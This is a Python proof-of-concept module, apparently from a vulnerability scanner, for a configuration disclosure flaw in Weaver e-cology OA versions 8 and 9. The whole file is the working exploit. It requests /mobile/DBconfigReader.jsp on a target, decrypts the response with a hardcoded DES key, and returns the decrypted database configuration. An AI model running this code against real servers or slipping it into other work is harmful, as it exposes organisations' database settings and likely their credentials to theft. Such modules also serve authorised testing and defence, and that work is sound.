#/usr/bin/python3

import pyDes
from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class Weaver_Ecology_Oa_Config_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': '泛微-OA Config信息泄露漏洞',
            'description': '泛微-OA Config信息泄露漏洞,影响范围为: 泛微e-cology OA系统 V8 V9版本',
            'date': '2019-10-24',
            'exptype': 'check',
            'type': 'Infomation'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent(),
        }

    def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            url = self.url + "/mobile/DBconfigReader.jsp"
            check_req = request.get(url, headers = self.headers)
            if check_req.status_code == 200:
                cipherX = pyDes.des('        ')
                cipherX.setKey('1z2x3c4v5b6n')
                result = cipherX.decrypt(check_req.content.strip()).strip().decode('utf-8')
                print("存在泛微config信息泄露漏洞")
                return True, result
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if __name__ == '__main__':
    Weaver_Ecology_OA_Config = Weaver_Ecology_Oa_Config_BaseVerify('http://127.0.0.1')
    Weaver_Ecology_OA_Config.check()